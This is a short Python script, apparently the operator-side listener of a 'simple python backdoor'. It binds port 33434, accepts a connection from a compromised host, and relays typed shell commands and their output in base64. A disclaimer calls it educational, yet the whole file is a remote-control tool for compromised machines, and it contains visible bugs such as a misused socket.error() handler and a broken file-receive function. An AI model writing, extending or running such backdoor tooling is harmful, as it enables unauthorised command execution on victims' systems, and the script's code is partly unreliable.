#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# ----------------------------------------------------
# This program is for educational purposes only!
# I am not responsible for anything you do with it.
# ----------------------------------------------------


# Imports
import base64
import socket


# Variables
__version__ = '0.0.1'
CHUNKS = 2048
PORT = 33434


def _base64_encode(message):

    """Encode the bytes-like object s using Base64 and return a bytes object."""

    return base64.b64encode(message.encode())


def _base64_decode(message):

    """Decode the Base64 encoded bytes-like object and return a ASCII string."""

    return base64.b64decode(message).decode()


def simple_python_backdoor_create_socket():
    try:
        object_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Reuse a socket even if its recently closed.
        object_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return object_socket
    except socket.error() as str_error:
        print(f'Error creating socket {str_error}')


def simple_python_backdoor_socket_bind(sock):

    try:
        print(f'Server started and listening on Port: +{PORT}...')
        sock.bind(('', PORT))
        sock.listen(5)
    except socket.error() as str_error:
        print(f'Error binding socket {str_error}.\nRetrying...')


def simple_python_backdoor_recv_file(data, file):

    with open(file, 'wb') as _file:
        file.write(data)


def main():

    _socket = simple_python_backdoor_create_socket()
    simple_python_backdoor_socket_bind(_socket)

    try:
        connection, address = _socket.accept()
        # No timeout
        connection.setblocking(True)
        print(f'Connection has been established [IP: {address[0]} / PORT: {address[1]}]!!!')
    except socket.error() as str_error:
        print(f'\nError accepting connections!!!\n{str_error}')

    while True:
        data = connection.recv(CHUNKS)
        str_data = _base64_decode(data)

        # TODO: Function copy not workin.
        # if str_data == 'Attempting download...':
        #     pass
        #     # simple_python_backdoor_recv_file(str_data, 'recvice_file')
        # else:

        print(str_data)

        command = input('Shell >>> ').lower()
        output = _base64_encode(command)
        connection.send(output)


if __name__ == '__main__':
    main()
